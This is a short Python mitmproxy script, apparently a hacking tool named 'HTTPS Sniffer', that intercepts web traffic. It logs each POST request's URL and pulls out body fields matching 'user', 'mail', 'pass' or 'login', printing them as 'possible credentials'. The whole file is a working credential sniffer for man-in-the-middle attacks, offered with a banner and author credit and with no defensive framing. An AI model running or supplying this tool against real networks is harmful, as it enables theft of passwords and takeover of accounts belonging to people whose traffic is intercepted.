#!/usr/bin/env python3

from mitmproxy import http
from urllib.parse import urlparse

start = 1

def print_banner():
    print("""
█░█ ▀█▀ ▀█▀ █▀█ █▀   █▀ █▄░█ █ █▀▀ █▀▀ █▀▀ █▀█
█▀█ ░█░ ░█░ █▀▀ ▄█   ▄█ █░▀█ █ █▀░ █▀░ ██▄ █▀▄\n""")

    print("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""")

def parse_url(url):
    url_parsed = urlparse(url)
    return url_parsed.scheme, url_parsed.netloc, url_parsed.path

def parsing(data, keywords, char):
    exclude_keywords = ["Agent", "div", "header"]

    complete_data = data
    try:
        data = data.split(char)
        data = [d for d in data if any(keyword in d for keyword in keywords)]
        isValid = not any(keyword in ''.join(data) for keyword in exclude_keywords)
        return '\n'.join(data), isValid
    except:
        return complete_data

def parse_data(data, keywords):

    data, _ = parsing(data, keywords, '&')
    data, _ = parsing(data, keywords, '/')
    data, _ = parsing(data, keywords, '~')
    data, _ = parsing(data, keywords, '[')
    data, _ = parsing(data, keywords, '{')
    data, isValid = parsing(data, keywords, '\n')

    return data, isValid


def request(packet):
    global start

    if start:
        print_banner()
        start = 0

    if packet.request.method != "POST":
        return

    url = packet.request.url
    scheme, domain, path = parse_url(url)
    
    print(f"[+] Visited URL: {scheme}://{domain}{path}")

    keywords = ["user", "mail", "pass", "login"]

    data = packet.request.get_text()
    data, isValid = parse_data(data, keywords)
    
    if data and isValid:
        print(f"\nPosibles credenciales:\n\n{data}\n")
